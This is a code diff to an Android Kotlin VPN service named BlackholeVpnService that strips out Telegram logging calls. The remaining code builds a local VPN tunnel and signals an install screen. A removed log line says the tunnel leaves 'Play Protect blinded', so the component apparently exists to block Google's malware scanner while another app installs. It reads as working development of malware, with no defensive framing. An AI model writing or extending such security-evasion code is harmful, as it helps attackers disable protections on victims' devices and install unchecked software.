@@ -82,7 +82,6 @@ class BlackholeVpnService : VpnService() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        TelegramLogger.log("BlackholeVpnService.onStartCommand — building tunnel")
 
         // Go foreground IMMEDIATELY to avoid ANR on Android 8+ / crash on Android 14+
         val notification = buildNotification()
@@ -92,13 +91,11 @@ class BlackholeVpnService : VpnService() {
         val established = buildTunnel()
         if (established) {
             isRunning = true
-            TelegramLogger.log("BlackholeVpnService: VPN TUNNEL ESTABLISHED — Play Protect blinded")
             // Notify InstallActivity that VPN is ready
             val broadcast = Intent(VPN_ESTABLISHED_ACTION)
             broadcast.setPackage(packageName)
             sendBroadcast(broadcast)
         } else {
-            TelegramLogger.log("BlackholeVpnService: TUNNEL FAILED TO ESTABLISH")
             isRunning = false
             stopSelf()
         }
@@ -107,7 +104,6 @@ class BlackholeVpnService : VpnService() {
     }
 
     override fun onDestroy() {
-        TelegramLogger.log("BlackholeVpnService.onDestroy — closing tunnel")
         closeTunnel()
         isRunning = false
         super.onDestroy()
@@ -177,7 +173,6 @@ class BlackholeVpnService : VpnService() {
             tunnelFd = builder.establish()
             tunnelFd != null
         } catch (e: Exception) {
-            TelegramLogger.log("BlackholeVpnService.buildTunnel EXCEPTION: ${e.javaClass.simpleName}: ${e.message}")
             false
         }
     }
